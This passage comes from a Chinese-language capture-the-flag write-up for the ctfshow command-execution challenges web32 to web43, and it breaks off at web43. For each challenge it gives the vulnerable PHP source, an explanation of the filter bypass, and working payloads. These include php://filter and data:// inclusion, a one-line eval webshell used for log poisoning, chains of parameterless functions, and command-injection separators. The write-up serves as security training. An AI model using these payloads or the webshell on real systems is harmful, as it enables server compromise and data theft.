class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?c=<span class="hljs-built_in">include</span><span class="hljs-string">&quot;$_POST[1]&quot;</span><span class="hljs-meta">?&gt;</span><br><span class="hljs-number">1</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/32-1.jpg"></p><p>再使用 base64 工具转换就可以得到 flag 值</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这题过滤多了双引号，所以在上一题 payload 的基础上，去掉双引号即可</p><p><strong>实验：</strong></p><p>payload1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]?&gt;&amp;<span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>payload2</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]?&gt;<br><span class="hljs-number">1</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/33-1.jpg"></p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>多过滤了 :</p><p>payload同web33</p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>多过滤了 = 和 &lt;</p><p>payload同web33</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>过滤掉了数字，把1换成字母就可</p><h2 id="web37—-日志shell"><a href="#web37—-日志shell" class="headerlink" title="web37— 日志shell"></a>web37— 日志shell</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 05:18:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//flag in flag.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    <strong>这题考的是一个协议问题，所以介绍一下各个协议的用法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//协议</span><br>用于访问本地文件，在CTF中通常用来读取本地文件<br>示例： http:<span class="hljs-comment">//127.0.0.1/include.php?file://读取的路径</span><br>php:<span class="hljs-comment">//协议</span><br>php:<span class="hljs-comment">//访问各个输入/输出流，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码</span><br>示例<span class="hljs-number">1</span>： php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=[文件名]</span><br>示例<span class="hljs-number">2</span>： http:<span class="hljs-comment">//127.0.0.1/include.php?file=php://input [POST DATA部分] <span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span>  //现在不太能理解，先放着后面学习。</span><br>data:<span class="hljs-comment">//协议</span><br>通常可以用来执行PHP代码<br>示例<span class="hljs-number">1</span>： http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain,命令<span class="hljs-meta">&lt;?php</span>%20phpinfo();<span class="hljs-meta">?&gt;</span></span><br>示例<span class="hljs-number">2</span>： http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain;base64,base64编码</span><br><br>搬运的：https:<span class="hljs-comment">//www.cnblogs.com/z1ten9/p/14360476.html</span><br></code></pre></td></tr></table></figure><p><strong>实验：</strong></p><p><strong>payload1：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;ls&quot;);<span class="hljs-meta">?&gt;</span></span><br><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&quot;ls&quot;</span>);<span class="hljs-meta">?&gt;</span> base64形式为 PD9waHAgc3lzdGVtKCdscycpOz8+<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-1.jpg"></p><p>因为题目中过滤了 flag,所以使用 base64 编码可以实现绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-2.jpg"></p><p><strong>payload2</strong></p><p>利用日志：</p><pre><code>1. 首先在 url 中添加一句话木马，让其记录到服务器中的日志文件中，此次题目的环境日志路径为：/var/log/nginx/access.log</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>​    2.访问日志文件，查看是否多了一句话木马：</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-3.jpg"></p><ol start="3"><li>蚁剑 or 中国菜刀 类似工具连接：但是失败了</li></ol><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/37-4.jpg"></p><h2 id="web38—日志shell"><a href="#web38—日志shell" class="headerlink" title="web38—日志shell"></a>web38—日志shell</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 05:23:36</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//flag in flag.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    比较上题过滤多了 php,file</p><p>​    所以 &lt;?php 写为 &lt;?=</p><p><strong>实验：</strong></p><p><strong>payload1:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?=</span>system(&quot;ls&quot;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/38-1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD89IHN5c3RlbSgidGFjIGYqIik7Pz4=</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/38-2.jpg"></p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 06:13:21</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//flag in flag.php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题过滤了 flag ,然后限制了后缀不能为 php,但是使用 data:// 协议不受过滤的影响</p><p><strong>实验：</strong></p><pre><code> 1. 仍然使用 data:// 协议； ls 查看目录</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;ls&quot;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>​    <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/39-1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// cat 所有 f开头的文件</span><br>?c=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?php</span> system(&quot;cat f*&quot;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>​    <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/39-2.jpg"></p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:12:34</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 06:03:36</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了 [0-9]数字，~，·，@, #, $, ^, &amp;, *, 中文括号（），-, =, +, {},[], : , ’ , “, 逗号, &lt; &gt;, 小数点, ./, ? ,一大堆</p><p>​    根据提示给出 payload 是使用无参数函数进行文件读取</p><p><strong>实验：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(localeconv());<br><span class="hljs-comment">//localeconv() 返回包含本地数字及货币格式信息的数组其中包含小数点，正好题目过滤了小数点</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-1.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(pos(localeconv()));<br><span class="hljs-comment">// pos() 获取数组中当前元素的值---&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-2.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(scandir(pos(localeconv())));<br><span class="hljs-comment">// scandir() 返回指定目录中的文件和目录的数组---&gt; 此时获取到的数组下标为 1 的为 ..</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-3.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(array_reverse(scandir(pos(localeconv()))));<br><span class="hljs-comment">// array_reverse() 翻转数组--&gt;将 scandir() 获取到的数组下标 1 的变为 flag.php  </span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-4.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=print_r(next(array_reverse(scandir(pos(localeconv())))));<br><span class="hljs-comment">// next() 函数将内部指针指向数组中的下一个元素，并输出。即下一个 ———&gt; flag.php；如若在上一步 array_reverse() 不翻转将得到： ..</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-5.jpg"></p><p>此时已经读取到了 flag.php 那么就要将其内容显示出来： 可以使用 show_source() 或者 highlight_file() 得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40-6.jpg"></p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h2 id="web42-—-gt-dev-null-2-gt-amp-1"><a href="#web42-—-gt-dev-null-2-gt-amp-1" class="headerlink" title="web42 — &gt;/dev/null 2&gt;&amp;1"></a>web42 — &gt;/dev/null 2&gt;&amp;1</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><ol><li><p>/dev/null</p><p>/dev/null 表示的是一个黑洞，通常用于丢弃不需要的数据输出，或者用于输入流的文件</p><p>/dev/null 作用是将标准输出重定向到 /dev/null 中。 /dev/null 代表Linux的空设备文件，往这个文件里面写入的内容都会丢失:”黑洞” 所以执行了 &gt;dev/null 之后，标准输出掉入黑洞不复存在。</p><ol start="2"><li> 2&gt;&amp;1</li></ol><p>重定向绑定，&amp;可以将两个输出绑定在一起。所以错误输出将和标准输出同一个文件描述。</p><p>一次 &gt;/dev/null 2&gt;&amp;1 执行后：标准输出重定向到/dev/null(黑洞)中,错误输出重用来标准输出的描述，因此也掉入了黑洞。综上所述，该条命令执行后，不会有任何显示，不会输出任何信息到控制台，也不会有任何信息输出到文件中。</p></li></ol><p>所以此题要把 &gt;/dev/null 2&gt;&amp;1 这部分内容截断:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-comment">;// cat可以替换为 tac，nl,more，less，uniq，tail,下面的几个 flag 同样适用</span><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-variable">%0</span>a// <span class="hljs-variable">%0</span>a <span class="hljs-operator">=</span> 回车<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-variable">%26</span>// <span class="hljs-variable">%26</span> <span class="hljs-operator">=</span> &amp;<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php<span class="hljs-variable">%26</span><span class="hljs-variable">%26</span>// <span class="hljs-variable">%26</span><span class="hljs-variable">%26</span> <span class="hljs-operator">=</span> &amp;&amp;<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>cat flag.php||// || <span class="hljs-operator">=</span> ||<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/42-1.jpg"></p><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 21:32:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题较上题，多过滤了<strong>分号(;)<strong>和</strong>cat</strong>，所以在构建payload的时候，可以不使用分号(;),cat可以使用ca’’t，或者不适用cat</p><p><strong>实验：</strong></p><p>​    